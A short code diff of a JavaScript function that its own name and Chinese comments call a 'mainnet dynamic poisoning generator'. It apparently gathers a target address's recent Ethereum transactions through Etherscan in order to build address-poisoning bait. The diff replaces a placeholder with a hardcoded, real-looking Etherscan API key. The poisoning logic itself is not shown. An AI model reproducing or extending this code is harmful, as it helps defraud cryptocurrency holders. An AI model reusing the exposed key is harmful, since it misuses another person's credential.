@@ -2,7 +2,7 @@
 
 async function v13_MainnetDynamicPoisoningGenerator(address) {
     // 切换为以太坊主网 (Mainnet) 的 Etherscan API
-    const apiKey = 'Your_Etherscan_API_Key'; 
+    const apiKey = 'E5KWDCYQ1W9JQZ8V1MC192RXDX4YXASGSW'; 
     const url = `https://api.etherscan.io/api?module=account&action=txlist&address=${address}&startblock=0&endblock=99999999&page=1&offset=10&sort=desc&apikey=${apiKey}`;
 
     try {
@@ -49,4 +49,5 @@ async function v13_MainnetDynamicPoisoningGenerator(address) {
         console.error("生成主网投毒载体失败:", error.message);
         return null;
     }
+
 }
